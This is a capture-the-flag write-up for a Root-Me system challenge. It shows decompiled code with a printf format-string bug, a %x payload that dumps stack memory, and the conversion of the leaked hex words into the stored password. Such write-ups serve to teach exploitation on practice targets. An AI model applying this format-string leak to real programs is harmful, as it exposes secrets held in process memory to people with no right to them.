### S0lv3d by H4yicl3

First I download binary file with my scp-script
```
#!/bin/sh
echo "password = app-systeme-$1"
scp -P2222 app-systeme-$1@challenge02.root-me.org:./$1 ./

then ./scp [name_of_challenge]
```
I use IDA to analysis the code .
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *file; // ST28_4@1
  int result; // eax@1
  int v5; // edx@1
  int buf; // [sp+2Ch] [bp-24h]@1
  int stackcookie; // [sp+4Ch] [bp-4h]@1

  stackcookie = *MK_FP(__GS__, 20);
  file = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
  fgets((char *)&buf, 32, file);
  printf(argv[1]);			//print(argv[1]) -> formatstring bug
  fclose(file);
  result = 0;
  v5 = *MK_FP(__GS__, 20) ^ stackcookie;
  return result;
}
```
we have already knew this program have bug formatstring

we try to get the address hex stack with the following steps:

```
./ch5 %x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x
20_804b008_b7fceff4_8048570_8049ff4_2_bffffca4_b7fcf3e4_d_804b008_39617044_28293664_6d617045_b7000a64
```
Now we see after 804b008 .that is the array ascii value and see the last charracter have \x0a (b7000a64)
so we think this is string of password instead

> We need to convert this to ascii code !! 
>39617044_28293664_6d617045_0a64
>little endian -> ascii 
>44706139_64362928_4570616d_64

we have the string ascii code !! try it with decompile online 
http://www.rapidtables.com/convert/number/hex-to-ascii.htm
or you can try it with hand.

Ok !! then we get the password.
